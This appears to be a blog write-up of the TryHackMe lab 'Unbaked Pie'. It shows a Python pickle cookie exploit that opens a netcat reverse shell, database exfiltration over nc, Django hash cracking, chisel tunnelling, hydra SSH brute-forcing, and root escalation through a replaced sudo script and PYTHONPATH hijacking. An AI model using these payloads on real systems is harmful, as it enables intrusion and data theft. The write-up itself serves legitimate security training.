---
title: "Unbaked Pie TryHackMe Writeup"
last_modified_at: 2020-12-03T11:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - django
  - sqlite
  - hydra
  - chisel port tunneling
  - SSH bruteforcing
  - SUID
  - unbaked pie
  - Path hijacking
  - sqlite
  - hashcat
---
![unbaked](/assets/images/thm/unbaked_pie/unbaked.png)

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

[Unbaked Pie](https://tryhackme.com/room/unbakedpie) is a medium rated TryHackMe room by [H0j3n](https://tryhackme.com/p/H0j3n). This writeup includes desearialization of untrusted user data, django user's hash cracking, port tunneling using chisel,SSH bruteforcing using hydra, path hijacking and much more.

# Port Scan
## All Port Scan
```console
local@local:~/Documents/tryhackme/unbaked_pie$ nmap -v -p- -Pn --min-rate 10000 -oN nmap/all-ports 10.10.28.159
Nmap scan report for 10.10.28.159
Host is up (0.35s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
5003/tcp open  filemaker

```
Only one port is open.

## Detail Scan
```console
local@local:~/Documents/tryhackme/unbaked_pie$ nmap -p5003 -sC -sV 10.10.28.159 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 17:36 +0545                       
Nmap scan report for 10.10.28.159                                                       
Host is up (0.32s latency).                                                             
                                                                                                                                                                                
PORT     STATE SERVICE    VERSION                                                       
5003/tcp open  filemaker?            
| fingerprint-strings:                                                                                                                                                          
|   GetRequest:                                                                         
|     HTTP/1.1 200 OK                                                                   
|     Date: Thu, 03 Dec 2020 11:51:17 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8 
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=TAjQQQg0VofWBifmxXMCa2SIOBntbL4vIlJJOX7TAqRGNzLTd9ELeV0XU22R9ZEH; expires=Thu, 02 Dec 2021 11:51:17 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 03 Dec 2020 11:51:18 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8 
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=IGXpGi3jiyDXpetafCrLD9ITIL6WwTCoKBmQ6WtdO9sPkPR2i1MjWx4m9tnbv2vu; expires=Thu, 02 Dec 2021 11:51:18 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
....
....

```
Nmap accurately couldnot find out which sevice is running on the port 5003, but looking at the results, it looks like HTTP service is running on port 5003.

# PORT 5003
![1](/assets/images/thm/unbaked_pie/1.png)

We can see a webpage which different options like search, login and signup. So, to become familiar with the logic implemented I manually clicked on all links and observed the request/response using burpsuite. Doing so, I found something interesting on search functionality.

## Search functionality
![2](/assets/images/thm/unbaked_pie/2.png)
After we make a POST request to /search, the backend server send the response along with a new cookie called **search_cookie** which looks like the python serialized object.
### Deserializing the object
```console
local@local:~/website/myblog$ python
Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> val = b"gASVCAAAAAAAAACMBHRlc3SULg=="
>>> from base64 import b64decode
>>> test = b64decode(val)
>>> test
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.'
>>> pickle.loads(test)
'test'
```
Serialization is used to convert python object into a stream of data and we send the stream of the data to the backend where it is deserialized to obtain the python object. But if the untrusted user input is deserialized without sanitization, it might cause a lot of problems.
Lets send a malicious payload to check whether there is proper sanitization or not. I have followed [this](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) article to get code execution.

## Creating malilicous object 
```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('ping -c 1 10.6.31.213')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

```console
local@local:~/Documents/tryhackme/unbaked_pie$ python exp.py 
b'gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBVwaW5nIC1jIDEgMTAuNi4zMS4yMTOUhZRSlC4='
```
Now, we will replace the value of the cookie with this new value and check if we get a ping back from the box.

## Making a GET request with new cookie
![3](/assets/images/thm/unbaked_pie/3.png)
After we made the request, if we check the tcpdump result, we get a ping back, which means we have code execution.
```console
local@local:~/Documents/tryhackme/unbaked_pie$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
18:02:19.830239 IP 10.10.28.159 > local: ICMP echo request, id 623, seq 1, length 64
18:02:19.830285 IP local > 10.10.28.159: ICMP echo reply, id 623, seq 1, length 64
```

# Reverse Shell
### Updated file content
```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
```console
local@local:~/Documents/tryhackme/unbaked_pie$ python exp.py 
b'gASVaQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC42LjMxLjIxMyA5MDAxID4vdG1wL2aUhZRSlC4='
```
And if we made the request with the new value of the cookie, we get a shell back.
```console
local@local:~/Documents/tryhackme/unbaked_pie$ nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.28.159 47874
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
We are root but only inside the docker container.

## Getting a Proper Shell
Now this shell is a bit hard to work with as it is not interactive. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. So We have to make this session a interactive session.

## Getting a proper TTY
Now lets get a proper shell with auto completion.
```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
Hit CRTL+z to background the current process and on local box type
```console
local@local:~/Documents/tryhackme/unbaked_pie$ stty raw -echo
```
and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
```console
root@8b39a559b296:/home/site#  export TERM=xterm
```
Now we have a proper shell.

# Privilige Escalation

## Root user's .bash_history
```console
root@8b39a559b296:/home/site# cd /root
root@8b39a559b296:~# cat .bash_history 
nc               
exit
ifconfig
ip addr 
ssh 172.17.0.1
ssh 172.17.0.2
exit             
ssh ramsey@172.17.0.1
exit                  
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh                                                   
./check-config.sh                                                          
nano /etc/default/grub
vi /etc/default/grub         
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
```
Here we can clearly see that the user was trying to login into 172.17.0.1 using SSH as user ramsey. And as this is a docker container, that IP is the IP address of the host. But the SSH was not open on all interfaces otherwise we would have seen on the output of the nmap.

### Port Scan using nc
As there was no nmap on the docker container, I used netcat for scanning for open ports.
```console
root@8b39a559b296:~# nc -zv 172.17.0.1 1-65535
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 5003 (?) open
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 22 (ssh) open
```
And it turned out SSH is open on the 172.17.0.1 interface.
Even though SSH was open and we know a user on the box, we still do not know the password for the user. So, I began to enumerate the docker container if there are any sensitive files leaking the credentials.

## Enumeration Django app
On the home page, there were files for django app.
```console
root@8b39a559b296:/home# ls -la
total 28
drwxr-xr-x 1 root root 4096 Dec  3 12:22 .
drwxr-xr-x 1 root root 4096 Oct  3 13:48 ..
drwxrwxr-x 8 root root 4096 Oct  3 11:03 .git
drwxrwxr-x 2 root root 4096 Oct  3 11:03 .vscode
-rwxrwxr-x 1 root root   95 Oct  3 11:03 requirements.sh
-rwxrwxr-x 1 root root   46 Oct  3 11:09 run.sh
drwxrwxr-x 1 root root 4096 Dec  3 11:15 site
```
And the database on the django app was sqlite. So, I downloaded the sqlite3 file using nc on my box to analyse the database.


## Using nc for file transfer
### On local box
```console
local@local:~/Documents/tryhackme/unbaked_pie$ nc -nvlp 9001 > db.sqlite3
Listening on 0.0.0.0 9001

```
### On remote Box
```console
root@8b39a559b296:/home/site# cat db.sqlite3 | nc 10.6.31.213 9001
```
This way we can transfer files using nc.

## Analysing sqlite database
```console
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions
```

### auth_user
```console
sqlite> select * from auth_user;
1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|
11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testing|||0|1|2020-10-02 10:16:45.686339|
12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|ramsey|||0|1|2020-10-02 14:42:44.388799|
13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|oliver|||0|1|2020-10-02 14:42:59.113998|
14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|
```
Here we get hash for 5 different users one of which is ramsey. And from the hashcat example-hashes page, I found that the mode for django hash is 10000.

### Cracking the hash
```console
local@local:~/Documents/tryhackme/unbaked_pie$ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt
```
Using rockyou only one hash for testing was cracked.
```
testing:lala12345
```
Now, as the credential reusing is very common, I think this might be the password for user ramsey but we can not SSH into the box as there was no SSH daemon on the container and the Port was not accessible from outside to try from our local box. So, I used chisel to create a port tunnel.
You can download chisel binary from [here](https://github.com/jpillora/chisel).

## Port Tunneling using chisel

### On local box
```console
local@local:~/Documents/tryhackme/unbaked_pie$ sudo ./chisel server -p 1880 --reverse
[sudo] password for local: 
2020/12/03 18:26:43 server: Reverse tunnelling enabled
2020/12/03 18:26:43 server: Fingerprint 03:bd:a3:5c:9e:ec:e5:be:54:0b:9d:bc:91:a8:4b:d9
2020/12/03 18:26:43 server: Listening on 0.0.0.0:1880...
```

### On remote box
I uploaded the chisel binary on the container using netcat.
```console
root@8b39a559b296:/home/site# ./chisel client 10.6.31.213:1880 R:22:172.17.0.1:22
2020/12/03 12:42:00 client: Connecting to ws://10.6.31.213:1880
2020/12/03 12:42:02 client: Fingerprint 03:bd:a3:5c:9e:ec:e5:be:54:0b:9d:bc:91:a8:4b:d9
2020/12/03 12:42:03 client: Connected (Latency 381.440889ms)
```
And the connection is made. If we were to check for the listening service on our box, we can find that Port 22 is listening.

```console
local@local:~/Documents/tryhackme/unbaked_pie$ ss -ltn | grep -i 22
LISTEN  0       4096                0.0.0.0:22           0.0.0.0:* 
```
Now lets try to login as user ramsey with the password we cracked earlier.
```console
local@local:~/Documents/tryhackme/unbaked_pie$ ssh ramsey@localhost
ramsey@localhost's password: 
Permission denied, please try again.
```
But the password was incorrect.
After enumerating the box for a while, I did not get any information regarding the password for user ramsey and hash cracking was not getting nowhere, so I decided to bruteforce the password for user ramsey. As the developer has used some sort of protection for hiding the SSH service, there was chances he/she might have used a weak password.

## Bruteforcing SSH using hydra
```console
local@local:~/Documents/tryhackme/unbaked_pie$ hydra -l ramsey -P /usr/share/wordlists/rockyou.txt ssh://localhost
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-03 18:31:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://localhost:22/
[22][ssh] host: localhost   login: ramsey   password: <ssh-redacted-password>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-03 18:31:24
```
And we get the password instantly.

### Logging as user ramsey
```console
local@local:~/Documents/tryhackme/unbaked_pie$ ssh ramsey@localhost 
ramsey@localhost's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.


Last login: Tue Oct  6 22:39:31 2020 from 172.17.0.2
ramsey@unbaked:~$ id
uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)

```

## Reading user flag
```console
ramsey@unbaked:~$ cat user.txt 
THM{ce778dd4************bcd7423}
```

# Privilege Escalation
### sudo -l
```console
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```
Our user can run vuln.py as user oliver. Lets check if we have a write permission on that file.

## Shell as oliver
```console
ramsey@unbaked:~$ ls -la vuln.py 
-rw-r--r-- 1 root ramsey 4369 Oct  3 23:27 vuln.py
```
I simply copied the file and created a new file called vuln.py and written a script to write to oliver .ssh directory.

### Creating SSH key pairs
```console
ramsey@unbaked:~$ ssh-keygen -f oliver
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in oliver.
Your public key has been saved in oliver.pub.
The key fingerprint is:
SHA256:3FdIH/6RaUlOWXzxSbcK029IQOfEuEvR4KtFG8inRZ0 ramsey@unbaked
The key's randomart image is:
+---[RSA 2048]----+
|          .=Boo**|
|        . ++*E=o@|
|         o O+++Xo|
|       . .=oB.=..|
|        S.o+oo o.|
|          oo  .  |
|         .       |
|                 |
|                 |
+----[SHA256]-----+
```

### Updated vuln.py
```console
ramsey@unbaked:~$ mv vuln.py vuln.bak
ramsey@unbaked:~$ cat vuln.py 
import os

os.system('mkdir /home/oliver/.ssh')
os.system('cp /home/ramsey/oliver.pub /home/oliver/.ssh/authorized_keys')
```
Now lets run this vuln.py as user oliver.
```console
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
ramsey@unbaked:~$ cat /home/oliver/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0XLAHGE7xW3voku37VtXbaHZFdFcBTuGZGa3DaeoJbLiOpxXZDv1qZEkHhOmx8g094q7ePl0RKpvFYDhAJ8KXJqgL+NV9p53CinKzCqXzV+Y2yhQsoy2nEMuxmusNksV+60TZq1u6XZEiRZ7sjN8KRSiU51mno++9xNH0mNqmGtJX3IWgti/3O2XuPWftzyP/aDIN0MkaEmqKARZ51v+qEmeLw1Q5D+Nd0zFaArih4Tgs52Z1h1mSsElL8XBg3yIwtXbCZUnNYCJvXYXkJ31+7i0+d6/tc/lkN03ZCdSzucvZUG2rsCu6/UwZdmTAmsS2PQJHZyByUzu0MHMi57av ramsey@unbaked
```
It ran successfully and also the file is created. So, lets use SSH to login as user oliver.

### Shell as oliver
```console
ramsey@unbaked:~$ chmod 600 oliver
ramsey@unbaked:~$ ssh -i oliver oliver@unbaked
The authenticity of host 'unbaked (127.0.1.1)' can't be established.
ECDSA key fingerprint is SHA256:Hec+oL7z07dkDWFMy7rs73U7+7HQdo+YtQO04CsFB1k.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'unbaked' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

oliver@unbaked:~$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
oliver@unbaked:~$ 
```
And we get in and also oliver is in the group sysadmin.

## Checking Sudo -l
```console
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```
There is any entry for user oliver that he can run file /opt/dockerScript.py as root and also can set the environment varibles.

## Content of /opt/dockerScript.py
```console
oliver@unbaked:~$ cat /opt/dockerScript.py
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```
Here docker is imported but using relative path. During the execution, python looks for the imported modules on the path mentioned on PYTHONPATH environment variable. As we can set the enviroment variable during the execution, we can creat our own docker.py module and set that path as the PYTHONPATH and during execution that file will run.

## Content of docker.py
```console
oliver@unbaked:~$ pwd
/home/oliver
oliver@unbaked:~$ cat docker.py 
import os

os.system('chmod 4777 /bin/bash')
```
This code just sets the SUID bit on the /bin/bash binary.

## Executing the /opt/dockerScript.py file
```console
oliver@unbaked:~$ sudo PYTHONPATH=`pwd` /usr/bin/python /opt/dockerScript.py
Traceback (most recent call last):
  File "/opt/dockerScript.py", line 6, in <module>
    client = docker.from_env()
AttributeError: 'module' object has no attribute 'from_env'
```
We get an error but if we check the permission of the /bin/bash binary, SUID bit is set on it.
```console
oliver@unbaked:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1037528 Jul 13  2019 /bin/bash
```

## Getting a root shell
```console
oliver@unbaked:~$ /bin/bash -p
bash-4.3# id
uid=1002(oliver) gid=1002(oliver) euid=0(root) groups=1002(oliver),1003(sysadmin)
bash-4.3# 
```
And we are root.

## Reading root flag
```console
bash-4.3# cat /root/root.txt 
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{1ff4c89***********e90a5f}
```

## Beyond root
### Vulnerable code for desearialization vulnerability
```python
def search_articles(request):
    try:
        cookie = request.COOKIES.get('search_cookie')
        cookie = pickle.loads(base64.b64decode(cookie))
    except:
        pass
    if request.method == 'POST':  
        query = request.POST.get('query')
        encoded_cookie = base64.b64encode(pickle.dumps(query)) #dumps pickle
        encoded_cookie = encoded_cookie.decode("utf-8")
        if query:   
            results = Article.objects.filter(Q(title__icontains=query)|Q(body__icontains=query))
        else:
            results = Article.objects.all()
    context = {
        'results':results,
    }
    html = render(request, 'homepage/search.html', context)
    html.set_cookie('search_cookie', encoded_cookie)
    return html
```
On the search_articles function, at first the check is made whether there is **search_cookie** on the cookies and if it exists it is decoded and desearialized using pickle.loads without any sanitization which enabled us to get code execution on the docker container.




